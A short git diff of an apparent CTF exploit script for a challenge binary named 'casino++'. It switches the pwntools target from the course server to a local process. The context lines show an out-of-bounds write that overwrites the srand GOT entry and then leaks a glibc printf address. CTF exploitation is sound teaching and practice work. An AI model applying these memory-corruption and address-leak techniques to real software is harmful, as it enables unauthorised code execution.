@@ -24,8 +24,8 @@ def casinoLoop(which, lhalf, rhalf):
     r.sendlineafter("Chose the number {}: ".format(which), str(lhalf))
 
 
-# r = process('./casino++', env={"LD_PRELOAD" : "./libc.so"})
-r = remote('edu-ctf.csie.org', 10176)
+r = process('./casino++', env={"LD_PRELOAD" : "./libc.so"})
+# r = remote('edu-ctf.csie.org', 10176)
 # r = remote('127.0.0.1', 8888)
 pause()
 
@@ -41,6 +41,7 @@ offset_from_guess_to_srandgot = int((0x6020d0 - 0x602040) / 4)
 casinoLoop(-offset_from_guess_to_srandgot + 1, 0, 0x400700)
 
 ################################################## leak glibc addr
+# r.interactive()
 printf_libc = u64(r.recv(6) + '\0\0')
 success("printf@glibc leak addr: {:x}".format(printf_libc))
 
